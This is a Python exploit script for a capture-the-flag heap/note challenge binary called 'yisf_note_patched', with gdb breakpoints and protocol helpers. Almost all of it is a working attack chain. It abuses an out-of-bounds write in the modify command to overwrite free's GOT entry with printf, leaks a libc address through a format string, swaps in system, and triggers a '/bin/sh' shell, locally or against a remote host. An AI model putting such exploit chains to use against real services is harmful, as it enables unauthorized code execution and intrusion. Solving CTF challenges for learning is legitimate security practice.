#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./yisf_note_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500

b *0x401780
b *0x4015B7
b *0x401420
b *0x40148A
b *0x4016EC

c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def send_command(command):
    length = str(len(command)).zfill(5).encode()
    s(length + command)

def create_note(name, desc, data):
    name_padded = name[:5].ljust(5, b'\x00')
    desc_padded = desc[:5].ljust(5, b'\x00')
    command = b'W' + name_padded + desc_padded + p32(len(data)) + data
    send_command(command)

def read_note(index):
    command = b'R' + p16(index)
    send_command(command)

def list_notes():
    command = b'L'
    send_command(command)

def modify(index, new_data):
    command = b'M' + p16(index) + p32(len(new_data)) + new_data
    send_command(command)

def delete(index):
    command = b'D' + p16(index)
    send_command(command)

# ==================== EXPLOIT ====================
p = start()

'''
Struct size: 0x20
Total node element: 4000
-> Name variable at index: (0x4234C0 - 0x4040C0) / 0x20 = 4000
Out-of-bound write in modify function
'''

sla(b'name : ', flat(b'A'*0x8, 0, exe.got.free, 0x100))

modify(4000, p64(exe.plt.printf))

write(b'A', b'%17$p')
delete(0)

libc.address = hexleak(ru(b'======= <option> =======', drop=True)) - 0x29d90
slog('libc base @ %#x', libc.address)

modify(4000, p64(libc.sym.system))

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

write(b'A', b'/bin/sh\0')
delete(0)


interactive()
